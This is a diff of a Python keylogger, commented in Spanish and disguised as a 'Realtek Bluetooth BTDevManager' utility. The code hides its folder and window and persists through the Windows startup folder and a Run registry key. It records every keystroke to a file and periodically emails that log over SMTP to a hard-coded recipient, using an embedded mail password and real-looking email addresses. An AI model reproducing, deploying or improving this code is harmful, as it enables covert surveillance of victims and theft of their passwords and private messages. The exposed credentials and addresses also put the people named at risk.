@@ -46,11 +46,9 @@ def ocultar_carpeta(ruta_carpeta):
 ocultar_carpeta(ruta_script)
 
 # Nuevas funciones para crear acceso directo y agregar al registro de inicio
-
 def crear_acceso_directo_startup(nombre_ejecutable, ruta_destino):
     startup_folder = winshell.startup()
     acceso_directo_path = os.path.join(startup_folder, f'{nombre_ejecutable}.lnk')
-
     try:
         with winshell.shortcut(acceso_directo_path) as shortcut:
             shortcut.path = ruta_destino
@@ -62,7 +60,6 @@ def crear_acceso_directo_startup(nombre_ejecutable, ruta_destino):
 def agregar_registro_inicio(nombre_ejecutable, ruta_destino):
     key = r"Software\Microsoft\Windows\CurrentVersion\Run"
     value_name = nombre_ejecutable
-
     try:
         key_handle = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key_handle, value_name, 0, winreg.REG_SZ, ruta_destino)
@@ -93,7 +90,6 @@ class RealtekBluetoothBTDevManager:
                 self.borrar_count += 1
             else:
                 self.eventos += self.traducir_tecla(tecla, self.bloc_mayus_activado)
-
         except Exception as e:
             print(f"Error al procesar tecla: {e}")
 
@@ -113,9 +109,7 @@ class RealtekBluetoothBTDevManager:
             return "[flecha derecha]"
         elif nombre_tecla.startswith("[Shift r]"):
             return "[shift]"
-        elif nombre_tecla.startswith("[Alt l]"):
-            return "[alt]"
-        elif nombre_tecla.startswith("Alt l"):
+        elif nombre_tecla.startswith("[Alt l]") or nombre_tecla.startswith("Alt l"):
             return "[alt]"
         else:
             return f"[{nombre_tecla.capitalize()}]"
@@ -127,13 +121,10 @@ class RealtekBluetoothBTDevManager:
             if self.eventos.strip():
                 fecha_hora_actual = datetime.now()
                 self.eventos = f"{fecha_hora_actual.strftime('%H:%M')}] {self.eventos}"
-
                 with open(os.path.join(ruta_script, 'registro.txt'), 'a') as archivo:
                     archivo.write(self.eventos + '\n')
-
         except Exception as e:
             print(f"Error al escribir en el archivo: {e}")
-
         self.eventos = ""
         self.borrar_count = 0
 
@@ -149,31 +140,25 @@ class RealtekBluetoothBTDevManager:
 
     def enviar_correo(self):
         try:
-            from_email = 'hackeadxputx@hotmail.com'
-            to_email = 'mauricioboted@gmail.com'
+            from_email = 'hackeadxputx@hotmail.com' # Poner el correo de la computadora
+            to_email = 'mauricioboted@gmail.com' # Poner el correo de quién reciba las pulsaciones 
             subject = 'Informe del Realtek Bluetooth BTDevManager'
             body = 'Adjunto encontrarás el registro de actividades capturadas por el Realtek Bluetooth BTDevManager.'
-
             mensaje = MIMEMultipart()
             mensaje['From'] = from_email
             mensaje['To'] = to_email
             mensaje['Subject'] = subject
             mensaje.attach(MIMEText(body, 'plain'))
-
             with open(os.path.join(ruta_script, 'registro.txt'), 'rb') as adjunto:
                 adjunto_part = MIMEApplication(adjunto.read(), Name='registro.txt')
                 adjunto_part['Content-Disposition'] = f'attachment; filename={os.path.basename("registro.txt")}'
                 mensaje.attach(adjunto_part)
-
             servidor_smtp = smtplib.SMTP('smtp.elasticemail.com', 2525)
             servidor_smtp.starttls()
             servidor_smtp.login(from_email, '9848BB3C62ECE23E142BD9F72211CD95EBF2')  # Reemplaza 'tu_contraseña' con tu contraseña real
-
             servidor_smtp.sendmail(from_email, to_email, mensaje.as_string())
             servidor_smtp.quit()
-
             print("Correo enviado con éxito")
-
         except Exception as e:
             print(f"Error al enviar el correo electrónico: {e}")
 
@@ -193,27 +178,20 @@ class RealtekBluetoothBTDevManager:
         # Configurar la aplicación y la ventana principal para establecer el ícono
         app = QApplication(sys.argv)
         main_win = QMainWindow()
-
         # Modifica la siguiente línea con la ruta correcta a tu icono en la carpeta "Descargas"
         icono_path = os.path.join(os.path.expanduser('~'), 'Descargas', 'setting.png')
-
         main_win.setWindowIcon(QIcon(icono_path))
         main_win.hide()  # Oculta la ventana principal
-
         # Iniciar la aplicación en un hilo separado
         threading.Thread(target=app.exec_, daemon=True).start()
 
     def iniciar(self):
         self.mensaje_inicio()
-
         # Programar el envío periódico de correos electrónicos en un hilo separado
         threading.Thread(target=self.bucle_envio_correo, daemon=True).start()
-
         self.iniciar_gui()
-
         with pynput.keyboard.Listener(on_press=self.tecla_usuario) as listener:
             threading.Thread(target=self.temporizador_reporte, daemon=True).start()
-
             while True:
                 time.sleep(1)
 
